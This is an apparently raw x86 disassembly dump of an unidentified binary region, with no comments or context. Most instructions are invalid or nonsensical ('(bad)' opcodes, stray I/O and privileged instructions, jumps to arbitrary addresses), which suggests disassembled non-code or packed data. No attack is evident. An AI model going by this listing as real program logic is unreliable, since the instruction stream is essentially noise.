  409caa:	or     ah,BYTE PTR [edx-0x53]
  409cad:	inc    ebp
  409cae:	or     dh,BYTE PTR [edi+0x58c1f01a]
  409cb4:	popa   
  409cb5:	ins    DWORD PTR es:[edi],dx
  409cb6:	adc    BYTE PTR [eax+eiz*4],0x94
  409cba:	inc    esp
  409cbb:	dec    edx
  409cbc:	and    DWORD PTR [eax],0x76c0d650
  409cc2:	ror    BYTE PTR [edx],0xe7
  409cc5:	(bad)  
  409cc6:	nop
  409cc7:	add    bh,BYTE PTR [edx]
  409cc9:	in     eax,dx
  409cca:	test   BYTE PTR [ebp+0x2bb74241],cl
  409cd0:	cwde   
  409cd1:	int    0xd
  409cd3:	mov    edx,0xa74b60d4
  409cd8:	nop
  409cd9:	and    al,BYTE PTR [ecx]
  409cdb:	cdq    
  409cdc:	add    dl,dl
  409cde:	test   edx,0x222bef71
  409ce4:	and    eax,0x5aee0bb5
  409ce9:	cmc    
  409cea:	out    dx,al
  409ceb:	stos   DWORD PTR es:[edi],eax
  409cec:	(bad)  
  409ced:	sti    
  409cee:	dec    ebp
  409cef:	cmp    edi,DWORD PTR [edi+0x24288152]
  409cf5:	call   0x1a3f0c9
  409cfa:	(bad)  
  409cfb:	sub    edi,DWORD PTR [esp+eiz*8+0xa]
  409cff:	stos   DWORD PTR es:[edi],eax
  409d00:	pop    eax
  409d01:	inc    ebx
  409d02:	jl     0x409d41
  409d04:	jmp    0x1e923ae1
  409d09:	nop
  409d0a:	test   DWORD PTR [edi-0x60cf2fdd],ebx
  409d10:	or     ebx,DWORD PTR [edi]
  409d12:	or     eax,0xb540a670
  409d17:	call   0xcc3f:0x3a50b082
  409d1e:	lea    ebp,[ebx-0x51]
  409d21:	ror    BYTE PTR [ebp+0x6f],cl
  409d24:	repz sar BYTE PTR [ecx-0x4d34d7f9],0xf2
  409d2c:	faddp  st(7),st
  409d2e:	and    esp,edx
  409d30:	loop   0x409d42
  409d32:	pusha  
  409d33:	or     al,0x0
  409d35:	icebp  
  409d36:	mov    ebx,0xd184924c
  409d3b:	push   0xe63c78c4
  409d40:	mov    edi,DWORD PTR [edi-0xc]
  409d43:	sbb    al,0x99
  409d45:	out    dx,al
  409d46:	repz rol BYTE PTR [ebx-0x71],1
  409d4a:	xor    edx,ebx
  409d4c:	cmp    cl,BYTE PTR [ebp+0x7f]
  409d4f:	mov    eax,0x785a4a83
  409d54:	pop    ss
  409d55:	adc    esi,DWORD PTR ds:0xb576242b
  409d5b:	inc    esp
  409d5c:	(bad)  
  409d5d:	sbb    al,BYTE PTR [ebx+0x99352c1]
  409d63:	(bad)  
  409d64:	aaa    
  409d65:	mov    dh,0x7
  409d67:	and    bl,BYTE PTR [ebx+0x39]
  409d6a:	add    bl,ah
  409d6c:	sbb    al,0x80
  409d6e:	shl    bh,cl
  409d70:	add    al,ch
  409d72:	xchg   edx,eax
  409d73:	push   esp
  409d74:	int3   
  409d75:	nop
  409d76:	inc    edx
  409d77:	mov    ds:0x4fa07d75,al
  409d7c:	int3   
  409d7d:	pop    esi
  409d7e:	(bad)  
  409d7f:	jecxz  0x409d72
  409d81:	stos   BYTE PTR es:[edi],al
  409d82:	popa   
  409d83:	rol    BYTE PTR [eax],0x6f
  409d86:	std    
  409d87:	cli    
  409d88:	scas   eax,DWORD PTR es:[edi]
  409d89:	(bad)  
  409d8a:	jp     0x409d65
  409d8c:	fdivr  QWORD PTR [eax+0x3f]
  409d8f:	in     al,0x58
  409d91:	add    BYTE PTR [eax],ah
  409d93:	test   al,bh
  409d95:	lahf   
  409d96:	lods   al,BYTE PTR ds:[esi]
  409d97:	mov    ch,0xed
  409d99:	shr    DWORD PTR [eax-0x3c],1
  409d9c:	jo     0x409dd6
  409d9e:	in     al,0xf0
  409da0:	lock adc BYTE PTR [ecx],ch
  409da3:	and    eax,0xfeeffb7f
  409da8:	cmp    eax,0xbf018306
  409dad:	(bad)  
  409dae:	stos   DWORD PTR es:[edi],eax
  409daf:	mov    edi,0xe13264c2
  409db4:	fidiv  DWORD PTR [ebp+0x6ff6fc6b]
  409dba:	push   DWORD PTR [esi]
  409dbc:	mov    edi,0xcbbfbbfb
  409dc1:	aas    
  409dc2:	jmp    edi
  409dc4:	call   FWORD PTR [edi+ecx*4-0x9961383]
  409dcb:	div    dh
  409dcd:	sub    edx,esi
  409dcf:	mov    ecx,gs
  409dd1:	in     al,0x90
  409dd3:	and    cl,bh
  409dd5:	cmp    eax,0xbe942fca
  409dda:	sub    BYTE PTR [ebx+esi*4],dh
  409ddd:	stc    
  409dde:	pushf  
  409ddf:	jns    0x409d77
  409de1:	jnp    0x409e07
  409de3:	je     0x409d7a
  409de5:	mov    ah,0x68
  409de7:	or     bh,al
  409de9:	mov    ds:0xbb9277f6,eax
  409dee:	add    DWORD PTR [ebx-0x38],0x5ab5eac6
  409df5:	test   BYTE PTR [eax+eiz*4],al
  409df8:	jo     0x409e29
  409dfa:	xchg   ebx,eax
  409dfb:	pop    ecx
  409dfc:	shl    ecx,0xd4
  409dff:	sub    DWORD PTR [ecx+0x202f2e14],ebp
  409e05:	dec    esp
  409e06:	and    DWORD PTR [ebp-0xd],edx
  409e09:	in     al,dx
  409e0a:	pop    edx
  409e0b:	ror    BYTE PTR [edx+0x4d2ffb2a],0x5
  409e12:	std    
  409e13:	pop    esi
  409e14:	dec    edx
  409e15:	scas   eax,DWORD PTR es:[edi]
  409e16:	fwait
  409e17:	xor    BYTE PTR [esi],bh
  409e19:	sub    al,0xc8
  409e1b:	ret    
  409e1c:	xor    BYTE PTR [ecx+0xc],ah
  409e1f:	fadd   st,st(2)
  409e21:	jne    0x409e40
  409e23:	inc    edx
  409e24:	js     0x409e81
  409e26:	pop    ebx
  409e27:	loope  0x409ea3
  409e29:	(bad)  
  409e2a:	(bad)  
  409e2b:	cmp    eax,0x96589ee6
  409e30:	ret    
  409e31:	jnp    0x409e80
  409e33:	push   ss
  409e34:	adc    dl,cl
  409e36:	adc    DWORD PTR [ebp-0x5dff0595],edx
  409e3c:	std    
  409e3d:	inc    edi
  409e3e:	cmp    dl,BYTE PTR [edx]
  409e40:	jecxz  0x409dfe
  409e42:	xor    al,0x1d
  409e45:	ret    0x41ec
  409e48:	(bad)  
  409e49:	pop    edx
  409e4a:	(bad)  
  409e4b:	shl    BYTE PTR [esp+esi*8+0x7f3805eb],cl
  409e52:	inc    eax
  409e53:	push   ecx
  409e54:	pop    eax
  409e55:	je     0x409e80
  409e57:	rol    BYTE PTR [esi],1
  409e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5a:	mov    ch,0x9e
  409e5c:	cmp    BYTE PTR [eax+0x6e0f8eeb],bh
  409e62:	inc    eax
  409e63:	jno    0x409de6
  409e65:	(bad)  
  409e66:	lahf   
  409e67:	cmp    BYTE PTR [ecx+0x789b7ef6],cl
  409e6d:	push   ecx
  409e6e:	int3   
  409e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e70:	mov    ds:0x4d080c7,al
  409e75:	add    cl,0x60
  409e78:	adc    BYTE PTR [eax],0x82
  409e7b:	das    
  409e7c:	jle    0x409e77
  409e7e:	jmp    0x409edc
  409e80:	mov    ebx,0x23e0f25d
  409e85:	dec    edi
  409e86:	mov    dl,0xbd
  409e88:	jae    0x409e20
  409e8a:	loope  0x409e74
  409e8c:	add    al,0x69
  409e8e:	shr    BYTE PTR [ecx-0x552a0f9b],cl
  409e94:	sub    BYTE PTR [edx-0x741b6a46],ch
  409e9a:	inc    esi
  409e9b:	xchg   ebp,eax
  409e9c:	test   BYTE PTR [esi-0x4f],dh
  409e9f:	bound  ebx,QWORD PTR [ebx+0x5c]
  409ea2:	mov    esi,0x8bd00916
  409ea7:	pushf  
  409ea8:	add    BYTE PTR [ecx+eax*2+0x27],ch
  409eac:	lods   eax,DWORD PTR ds:[esi]
  409ead:	inc    edi
  409eae:	mov    ah,0x56
  409eb0:	add    eax,0x6501c1c1
  409eb6:	pop    ecx
  409eb7:	test   DWORD PTR cs:[esi-0x5054547f],ebx
  409ebe:	cli    
  409ebf:	into   
  409ec0:	in     eax,0xb8
  409ec2:	es inc eax
  409ec4:	iret   
  409ec5:	sbb    bl,al
  409ec7:	leave  
  409ec8:	xchg   ebx,eax
  409ec9:	daa    
  409eca:	jns    0x409ec6
  409ecc:	jmp    0x7057c78
  409ed1:	(bad)  
  409ed2:	xor    eax,0x43fdbdc8
  409ed7:	sahf   
  409ed8:	jl     0x409ecc
  409eda:	dec    ecx
  409edb:	scas   al,BYTE PTR es:[edi]
  409edc:	pop    esi
  409edd:	mov    ebp,0xcedbedca
  409ee2:	popa   
  409ee3:	jns    0x409ed2
  409ee5:	fidiv  DWORD PTR ds:0xf93fc9fe
  409eeb:	daa    
  409eec:	cld    
  409eed:	(bad)  
  409eee:	outs   dx,DWORD PTR ds:[esi]
  409eef:	std    
  409ef0:	push   ss
  409ef1:	dec    edi
  409ef2:	cmp    eax,0x7b0714f5
  409ef7:	mov    bh,0xc9
  409ef9:	xor    dh,BYTE PTR [edi]
  409efb:	fnsave [ecx-0x57]
  409efe:	xor    eax,0x273a5945
  409f03:	pop    esi
  409f04:	pop    esi
  409f05:	nop
  409f06:	out    0x45,eax
  409f08:	lods   eax,DWORD PTR ds:[esi]
  409f09:	pop    es
  409f0a:	cmp    BYTE PTR [esi+0x40121f2d],ch
  409f10:	push   esi
  409f11:	jp     0x409f09
  409f13:	out    dx,eax
  409f14:	test   esi,esi
  409f16:	pop    es
  409f17:	pop    es
  409f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f1a:	bound  ebx,QWORD PTR [ecx-0x6a]
  409f1d:	xor    eax,ebx
  409f1f:	pop    eax
  409f20:	lods   al,BYTE PTR ds:[esi]
  409f21:	and    esp,DWORD PTR [edi+0x71]
  409f24:	and    eax,eax
  409f26:	stc    
  409f27:	mov    esp,0x713f7f60
  409f2c:	or     al,0x5c
  409f2e:	dec    edx
  409f2f:	xchg   edi,eax
  409f30:	add    esp,DWORD PTR [eax+0x42aaab5c]
  409f36:	dec    esp
  409f37:	sbb    BYTE PTR [eax],dh
  409f39:	jle    0x409f4d
  409f3b:	push   ecx
  409f3c:	(bad)  
  409f3e:	xchg   esp,eax
  409f3f:	jb     0x409eea
  409f41:	rol    ebx,0x8d
  409f44:	push   ss
  409f45:	pop    es
  409f46:	jecxz  0x409f24
  409f48:	mov    cl,0x80
  409f4a:	add    BYTE PTR [esi-0x3f083021],0x31
  409f51:	xor    BYTE PTR [eax],cl
  409f53:	in     eax,0x18
  409f55:	adc    cl,0x9e
  409f58:	mov    esi,0xbe36161b
  409f5d:	stos   BYTE PTR es:[edi],al
  409f5e:	iret   
  409f5f:	mov    esi,0xb1e16b51
  409f64:	test   eax,0x2c4db440
  409f69:	scas   al,BYTE PTR es:[edi]
  409f6a:	ret    
  409f6b:	stos   BYTE PTR es:[edi],al
  409f6c:	dec    eax
  409f6d:	inc    edx
  409f6e:	push   ebp
  409f6f:	mov    ds:0x3413c62c,eax
  409f74:	fld    DWORD PTR [ebp+0x3846e104]
  409f7a:	pop    edx
  409f7b:	sub    edx,eax
  409f7d:	ficom  DWORD PTR [eax+0x2c16a17]
  409f83:	jb     0x409fc6
  409f85:	pop    esi
  409f86:	or     BYTE PTR [edx+0x2d],cl
  409f89:	nop
  409f8a:	jle    0x409fcd
  409f8c:	mov    DWORD PTR gs:0xdfec26cf,esp
  409f93:	jp     0x409f26
  409f95:	daa    
  409f96:	push   ds
  409f97:	jmp    0x98f80e6c
  409f9c:	int    0x66
  409f9e:	xchg   ebp,eax
  409f9f:	jecxz  0x409f50
  409fa1:	fxch   st(3)
  409fa3:	aaa    
  409fa4:	add    DWORD PTR [eax],esp
  409fa6:	(bad)  
  409fa7:	sbb    eax,0xd3a76798
  409fac:	loope  0x409ff9
  409fae:	pop    edi
  409faf:	(bad)  
  409fb0:	adc    edi,DWORD PTR [esi+0x4e2ddaff]
  409fb6:	aas    
  409fb7:	lock jle 0x40a030
  409fba:	dec    esi
  409fbb:	ds enter 0xfb68,0x34
  409fc0:	lods   eax,DWORD PTR ds:[esi]
  409fc1:	dec    esi
  409fc2:	fbld   TBYTE PTR ds:0xc7e5e8fa
  409fc8:	stos   BYTE PTR es:[edi],al
  409fc9:	hlt    
  409fca:	cmp    al,0x6
  409fcc:	cmp    DWORD PTR [eax+0x67],0xf9616090
  409fd3:	out    dx,eax
  409fd4:	inc    edi
  409fd5:	cli    
  409fd6:	push   edi
  409fd7:	inc    ebp
  409fd8:	add    DWORD PTR [ecx],0x58
  409fdb:	out    dx,eax
  409fdc:	or     esi,DWORD PTR [eax-0x65bfacf5]
  409fe2:	sub    DWORD PTR [edi+0x49247a77],esp
  409fe8:	mov    dh,BYTE PTR [ebp-0x14450ba7]
  409fee:	in     eax,dx
  409fef:	jno    0x409fc6
  409ff1:	dec    esp
  409ff2:	rcr    BYTE PTR [esi-0x22],0x5c
  409ff6:	mov    ch,0xf1
  409ff8:	jle    0x409fc2
  409ffa:	cmp    eax,0x3ec7c003
  409fff:	div    BYTE PTR [ecx-0x21f527ec]
  40a005:	retf   0x7c2f
  40a008:	loope  0x40a015
  40a00a:	fs pop ecx
  40a00c:	inc    esi
  40a00d:	mov    edi,0x9fe3e03f
  40a012:	clc    
  40a013:	jns    0x40a08f
  40a015:	fnstsw WORD PTR [esi]
  40a017:	dec    edi
  40a018:	ds stc 
  40a01a:	and    al,0x9f
  40a01c:	cld    
  40a01d:	in     al,0x27
  40a01f:	(bad)  
  40a021:	aas    
  40a022:	loopne 0x409fe9
  40a024:	pop    ss
  40a025:	mov    edi,0xbeafabc3
  40a02a:	retf   0xafeb
  40a02d:	mov    edi,0x97fcbfce
  40a032:	call   DWORD PTR [edx-0x1d00e81]
  40a038:	add    eax,0xed725979
  40a03d:	cli    
  40a03e:	int    0x5a
  40a040:	fisubr DWORD PTR ds:0xed447788
  40a046:	fild   QWORD PTR [ecx-0x539a383e]
  40a04c:	jg     0x40a009
  40a04e:	add    bh,BYTE PTR [edi+ebp*4-0x12]
  40a052:	mov    bh,0xe3
  40a054:	fiadd  DWORD PTR [eax-0x5e]
  40a057:	adc    al,0x7
  40a059:	pop    es
  40a05a:	push   ebx
  40a05b:	test   BYTE PTR [edi],0xdc
  40a05e:	adc    BYTE PTR [ebp+0x29],dl
  40a061:	pop    ebp
  40a062:	adc    dl,BYTE PTR [eax-0x758a3d6e]
  40a068:	ss int3 
  40a06a:	sub    dl,BYTE PTR [esp+ebp*2]
  40a06d:	ja     0x40a070
  40a06f:	enter  0xd1aa,0x74
  40a073:	mov    ebx,0x36a39b09
  40a078:	sti    
  40a079:	pop    es
  40a07a:	cmp    ebx,esp
  40a07c:	ret    
  40a07d:	add    bl,BYTE PTR [ebp-0x3a]
  40a080:	fst    QWORD PTR [edx+0x6c]
  40a083:	xchg   ebx,eax
  40a084:	aaa    
  40a085:	arpl   bx,di
  40a087:	ficom  WORD PTR [eax+esi*4-0x48]
  40a08b:	xor    dl,BYTE PTR [ebp-0x56]
  40a08e:	call   0xf121:0x4c712304
  40a095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a096:	inc    esp
  40a097:	ret    0xc7b2
  40a09a:	sahf   
  40a09b:	cmp    cl,BYTE PTR [eax]
  40a09d:	push   esp
  40a09e:	mov    edi,0x5405e457
  40a0a3:	loopne 0x40a0b5
  40a0a5:	stc    
  40a0a6:	or     ch,BYTE PTR [edx-0x4e3cf887]
  40a0ac:	inc    ecx
  40a0ad:	sbb    ecx,DWORD PTR [edi+ecx*2-0x7aebedfa]
  40a0b4:	gs ds ja 0x40a0e3
  40a0b8:	push   es
  40a0b9:	int    0xe6
  40a0bb:	xchg   BYTE PTR [eax+edx*4+0x75a594],bh
  40a0c2:	sub    DWORD PTR [esi+eax*1],ebp
  40a0c5:	mov    eax,0x9c7bfd75
  40a0ca:	cmp    esp,DWORD PTR ds:0xd51adad8
  40a0d0:	inc    esi
  40a0d1:	clc    
  40a0d2:	lds    edi,FWORD PTR ds:0xbc942c3f
  40a0d8:	cdq    
  40a0d9:	icebp  
  40a0da:	pop    ss
  40a0db:	(bad)  
  40a0dc:	daa    
  40a0dd:	dec    ecx
  40a0de:	ret    0x3870
  40a0e1:	in     al,0x85
  40a0e3:	pop    ss
  40a0e4:	pop    esi
  40a0e5:	in     al,0x6b
  40a0e7:	iret   
  40a0e8:	mov    esi,0x71e770cc
  40a0ed:	mov    dh,0x4f
  40a0ef:	ds (bad) 
  40a0f1:	(bad)  
  40a0f2:	lock and al,0xad
  40a0f5:	push   esi
  40a0f6:	mov    edi,0xa477b596
  40a0fb:	cmp    eax,0x62d15e1f
  40a100:	rcl    DWORD PTR [edx-0x493d9fc7],cl
  40a106:	xchg   BYTE PTR [esi-0x2a],cl
  40a109:	into   
  40a10a:	sbb    DWORD PTR [ecx+0x3ffc7100],ebx
  40a110:	into   
  40a111:	add    DWORD PTR [eax],edx
  40a113:	jbe    0x40a0df
  40a115:	push   0x55df4ce0
  40a11a:	or     al,0x20
  40a11c:	cld    
  40a11d:	bound  ebx,QWORD PTR ds:[edx]
  40a120:	xor    BYTE PTR [eax-0x4392a929],al
  40a126:	pop    ds
  40a127:	jb     0x40a145
  40a129:	push   es
  40a12a:	and    BYTE PTR [ecx-0x5f6847d2],al
  40a130:	mov    ch,0xf6
  40a132:	xor    DWORD PTR ds:0x61851426,0x2f
  40a139:	aas    
  40a13a:	loopne 0x40a11b
  40a13c:	(bad)  
  40a13d:	sti    
  40a13e:	inc    eax
  40a140:	into   
  40a141:	into   
  40a142:	ss aas 
  40a144:	sti    
  40a145:	mov    bl,0x3f
  40a147:	(bad)  
  40a148:	das    
  40a149:	(bad)  
  40a14a:	loop   0x40a17b
  40a14c:	icebp  
  40a14d:	int3   
  40a14e:	xor    ecx,edi
  40a150:	lock sti 
  40a152:	mov    edi,0xf6f679ff
  40a157:	imul   BYTE PTR [eax]
  40a159:	retf   
  40a15a:	xchg   edx,eax
  40a15b:	jmp    0x79026fd4
  40a160:	inc    edx
  40a161:	xchg   edx,eax
  40a162:	sub    al,0x53
  40a164:	mov    ebp,0x4528e4a3
  40a169:	cmp    eax,0xe51fba8a
  40a16e:	or     al,0xbc
  40a170:	pop    ss
  40a171:	ror    BYTE PTR [eax],0xdf
  40a174:	retf   
  40a175:	mov    ds:0x28924920,al
  40a17a:	pop    es
  40a17b:	xbegin 0x790604b5
  40a181:	pushf  
  40a182:	xor    DWORD PTR [ebx+0x12000f0b],ebx
  40a188:	and    DWORD PTR [ebp+0x54],eax
  40a18b:	into   
  40a18c:	xor    eax,0x5ee9caf4
  40a191:	pop    ebx
  40a192:	sub    dl,BYTE PTR [edi-0x70]
  40a195:	es xchg edx,eax
  40a197:	outs   dx,BYTE PTR ds:[esi]
  40a198:	inc    edi
  40a199:	xor    eax,ebp
  40a19b:	and    eax,0x2c8a5ab4
  40a1a0:	das    
  40a1a1:	fsub   QWORD PTR [ecx+eiz*4-0x69e28bb5]
  40a1a8:	xor    bh,cl
  40a1aa:	push   0x14
  40a1ac:	lahf   
  40a1ad:	test   al,0xbc
  40a1af:	jne    0x40a1fd
  40a1b1:	mov    eax,ds:0x7d170902
  40a1b6:	pop    eax
  40a1b7:	repnz sub ecx,eax
  40a1ba:	pusha  
  40a1bb:	pop    edx
  40a1bc:	and    al,0xd4
  40a1be:	inc    edi
  40a1bf:	push   cs
  40a1c0:	push   esi
  40a1c1:	xchg   ebp,eax
  40a1c2:	mov    al,0xf8
  40a1c4:	ins    DWORD PTR es:[edi],dx
  40a1c5:	sub    eax,0x978899b5
  40a1ca:	sbb    al,0x82
  40a1cc:	mov    ebx,esp
  40a1ce:	add    al,0x5b
  40a1d0:	cmp    DWORD PTR [esi+0x7d],esp
  40a1d3:	push   edx
  40a1d4:	push   eax
  40a1d5:	and    esp,edi
  40a1d7:	mov    al,ds:0x58753720
  40a1dc:	pop    edx
  40a1dd:	adc    BYTE PTR [esi],0x82
  40a1e0:	fstp   QWORD PTR [ebx]
  40a1e2:	fbld   TBYTE PTR [ebx-0x55]
  40a1e5:	jg     0x40a1a7
  40a1e7:	inc    ebx
  40a1e8:	setl   BYTE PTR [ecx-0x2cb2c416]
  40a1ef:	xchg   ebp,eax
  40a1f0:	cmp    eax,0x9a2edc7d
  40a1f5:	shl    BYTE PTR [eax+0x18306294],0x70
  40a1fc:	loope  0x40a1e0
  40a1fe:	and    eax,0x9e0fef7e
  40a203:	and    eax,0xc4e69f69
  40a208:	jmp    0x9d597b54
  40a20d:	mov    ds:0xac611bd3,al
  40a212:	pop    esp
  40a213:	fdivr  QWORD PTR [edx+0x34]
  40a216:	mov    al,0xb2
  40a218:	data16 (bad) 
  40a21a:	sti    
  40a21b:	jmp    0xde3b:0xb47e3dae
  40a222:	pop    eax
  40a223:	or     esp,DWORD PTR [esi+0x22d502f8]
  40a229:	test   al,0x51
  40a22b:	loope  0x40a207
  40a22d:	cmp    al,0x80
  40a22f:	mov    edx,0x398a040e
  40a234:	inc    edx
  40a235:	sub    al,0x56
  40a237:	std    
  40a238:	pop    ecx
  40a239:	inc    ebp
  40a23a:	inc    DWORD PTR [ebx-0x4bbd4627]
  40a240:	adc    dl,ah
  40a242:	pop    ebp
  40a243:	sbb    DWORD PTR [ecx],ecx
  40a245:	or     bh,al
  40a247:	aaa    
  40a248:	add    DWORD PTR [esp+edx*8],esi
  40a24b:	jmp    0xa2c33702
  40a250:	pop    esp
  40a251:	xor    al,0xe0
  40a253:	repz out 0xcf,eax
  40a256:	push   ebx
  40a257:	adc    al,0x5
  40a259:	(bad)  
  40a25b:	hlt    
  40a25c:	adc    ch,ch
  40a25e:	mov    dh,0x9b
  40a260:	and    eax,0xcb3abeb7
  40a265:	popf   
  40a266:	xchg   ebp,eax
  40a267:	(bad)  
  40a268:	in     eax,dx
  40a269:	cmp    ch,bh
  40a26b:	out    dx,al
  40a26c:	(bad)  
  40a26d:	rcr    edi,cl
  40a26f:	jmp    0x40a2e2
  40a271:	(bad)  
  40a272:	pop    edx
  40a273:	out    0x59,al
  40a275:	out    0x12,al
  40a277:	(bad)  
  40a278:	and    ah,BYTE PTR [ebp-0x5b6dbf50]
  40a27e:	in     al,dx
  40a27f:	(bad)  
  40a280:	out    0xd8,eax
  40a282:	pop    esp
  40a283:	mov    al,ds:0xa72fce7a
  40a288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a289:	pop    ds
  40a28a:	push   es
  40a28b:	dec    esp
  40a28c:	pusha  
  40a28d:	add    BYTE PTR [ecx-0x6c27782e],dl
  40a293:	pop    ds
  40a294:	loop   0x40a2c1
  40a296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a297:	mov    al,ds:0xf5e84ed3
  40a29c:	push   ebx
  40a29d:	fisubr DWORD PTR ds:0x2e9644c5
  40a2a3:	cmp    DWORD PTR [ebp+0x78974bc9],esp
  40a2a9:	es jno 0x40a24d
  40a2ac:	clc    
  40a2ad:	popw   ss
  40a2af:	pop    ebp
  40a2b0:	push   edi
  40a2b1:	sub    eax,0x66a965c6
  40a2b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b7:	test   al,0x9c
  40a2b9:	jg     0x40a24c
  40a2bb:	adc    DWORD PTR [ecx+0x78],0xffffff96
  40a2bf:	and    BYTE PTR [ebx],dl
  40a2c1:	and    BYTE PTR [ebp-0x50],bl
  40a2c4:	pop    es
  40a2c5:	inc    ebx
  40a2c6:	and    ebp,ebx
  40a2c8:	and    eax,0x32222266
  40a2cd:	daa    
  40a2ce:	cld    
  40a2cf:	cmp    eax,0x6245834a
  40a2d4:	mov    ch,0x41
  40a2d6:	xchg   edi,eax
  40a2d7:	outs   dx,BYTE PTR ds:[esi]
  40a2d8:	mov    ds:0x2a0bcd0,al
  40a2dd:	add    BYTE PTR [ebp+0x5a],bl
  40a2e0:	retf   0x3044
  40a2e3:	fnstcw WORD PTR [ebp-0x1ea1a4bc]
  40a2e9:	mov    cl,0x47
  40a2eb:	dec    esi
  40a2ec:	mov    al,ds:0x5d52aa94
  40a2f1:	fwait
  40a2f2:	retf   0x547d
  40a2f5:	iret   
  40a2f6:	pop    ds
  40a2f7:	jle    0x40a300
  40a2f9:	in     eax,0x9f
  40a2fb:	dec    esp
  40a2fc:	es jl  0x40a2ed
  40a2ff:	idiv   DWORD PTR [esi-0x1a299e36]
  40a305:	rol    DWORD PTR [edi-0x22],0xc3
  40a309:	(bad)  
  40a30a:	out    0x69,al
  40a30c:	cli    
  40a30d:	sub    DWORD PTR ds:0xc0dc4884,0xffffff9d
  40a314:	push   eax
  40a315:	gs fdivrp st(7),st
  40a318:	pop    ecx
  40a319:	arpl   si,si
  40a31b:	lea    edi,[ecx+0xa]
  40a31e:	push   edi
  40a31f:	cmp    DWORD PTR [ecx],eax
  40a321:	inc    ebp
  40a322:	mov    ah,0x3f
  40a324:	scas   al,BYTE PTR es:[edi]
  40a325:	imul   dl
  40a327:	adc    eax,0x9917f85
  40a32c:	push   ecx
  40a32d:	sub    DWORD PTR [edi-0x47],edi
  40a330:	enter  0x801,0x8c
  40a334:	mov    al,ds:0x70c149f
  40a339:	pop    ebp
  40a33a:	dec    edx
  40a33b:	mov    ebp,0x7c10023a
  40a340:	add    ecx,ebp
  40a342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a343:	int    0xfc
  40a345:	repz iret 
  40a347:	jns    0x40a2e0
  40a349:	xchg   BYTE PTR [edx],al
  40a34b:	ret    
  40a34c:	xor    DWORD PTR [eax],eax
  40a34e:	inc    eax
  40a34f:	or     BYTE PTR [ecx+0x38a08d80],ah
  40a355:	xor    DWORD PTR [edx+0x60738515],ecx
  40a35b:	add    eax,0x9a230f54
  40a360:	jp     0x40a31f
  40a362:	push   ds
  40a363:	imul   ebx,DWORD PTR [edx-0x7070e1ce],0x2f74e51c
  40a36d:	mov    bh,BYTE PTR [esi-0x41]
  40a370:	retf   0xbde
  40a373:	sbb    BYTE PTR [eax],ch
  40a375:	sub    DWORD PTR [ecx+0x52],edx
  40a378:	mov    ds:0xbcf85a95,al
  40a37d:	jge    0x40a3b7
  40a37f:	or     ah,BYTE PTR [ecx-0x47]
  40a382:	jp     0x40a3f9
  40a384:	pop    ds
  40a385:	mov    ds:0xe1008905,eax
  40a38a:	ret    
  40a38b:	and    cl,0x9c
  40a38e:	mov    BYTE PTR [eax+0x215f2190],0x6e
  40a395:	jns    0x40a415
  40a397:	inc    esi
  40a398:	and    BYTE PTR [ebx],cl
  40a39a:	lods   eax,DWORD PTR ds:[esi]
  40a39b:	xchg   esi,eax
  40a39c:	cmp    BYTE PTR fs:[eax+0x19],cl
  40a3a0:	hlt    
  40a3a1:	push   ebx
  40a3a2:	push   cs
  40a3a3:	ud2    
  40a3a5:	out    0x5a,al
  40a3a7:	arpl   WORD PTR [ebp+0x48],bp
  40a3aa:	xchg   ebp,eax
  40a3ab:	mov    ebp,DWORD PTR [edi+esi*8-0x60]
  40a3af:	test   BYTE PTR [esi+0x46],dl
  40a3b2:	sub    eax,0x5408057a
  40a3b7:	ss mov ecx,0x6c43a5ef
  40a3bd:	stos   BYTE PTR es:[edi],al
  40a3be:	jmp    0x9bda:0xbe21e3b5
  40a3c5:	add    al,0x85
  40a3c7:	pop    es
  40a3c8:	mov    BYTE PTR [edx],al
  40a3ca:	fs out 0x8e,al
  40a3cd:	(bad)  
  40a3ce:	cmp    edi,ebx
  40a3d0:	mov    WORD PTR [edi],es
  40a3d2:	pop    es
  40a3d3:	ret    0x9b1
  40a3d6:	push   ebp
  40a3d7:	sub    bl,BYTE PTR [edi-0x10]
  40a3da:	inc    edi
  40a3db:	or     BYTE PTR [edi+0x76],ah
  40a3de:	pop    eax
  40a3df:	xchg   ebx,eax
  40a3e0:	and    BYTE PTR [edi+ebx*4+0x6e30b027],dl
  40a3e7:	xor    BYTE PTR [eax+0x26],dl
  40a3ea:	cdq    
  40a3eb:	addr16 mov eax,0x942501b1
  40a3f1:	jecxz  0x40a450
  40a3f3:	in     al,dx
  40a3f4:	cld    
  40a3f5:	sti    
  40a3f6:	jl     0x40a3e0
  40a3f8:	inc    ebx
  40a3f9:	daa    
  40a3fa:	call   0xe5769ff6
  40a3ff:	xchg   DWORD PTR ds:0x6055fb5,eax
  40a405:	inc    ecx
  40a406:	ret    0x6eef
  40a409:	xlat   BYTE PTR ds:[ebx]
  40a40a:	sub    eax,0x5f7bfec3
  40a40f:	clc    
  40a410:	arpl   WORD PTR [esi],bp
  40a412:	pop    esp
  40a413:	leave  
  40a414:	cmp    bl,dh
  40a416:	rol    BYTE PTR [edi],0x18
  40a419:	ins    DWORD PTR es:[edi],dx
  40a41a:	sahf   
  40a41b:	mov    eax,ds:0xa946d83b
  40a420:	ss xchg ebp,eax
  40a422:	push   DWORD PTR [ebp-0x40e4b57]
  40a428:	pop    esi
  40a429:	xor    eax,0xa851aed0
  40a42e:	stos   BYTE PTR es:[edi],al
  40a42f:	mov    dl,0x88
  40a431:	mov    ebp,ss
  40a433:	call   0xc00c:0xf19b134d
  40a43a:	inc    esp
  40a43b:	jmp    0x40a43d
  40a43d:	cli    
  40a43e:	dec    ecx
  40a43f:	inc    eax
  40a440:	je     0x40a4a3
  40a442:	sbb    DWORD PTR [edx+esi*2-0x4b0c8ca],esi
  40a449:	and    DWORD PTR [edi+0x75],0xcb9c6047
  40a450:	ror    ah,1
  40a452:	jo     0x40a448
  40a454:	jb     0x40a46f
  40a456:	mov    eax,0xefaee2b1
  40a45b:	mov    ebx,DWORD PTR [edi+eax*4]
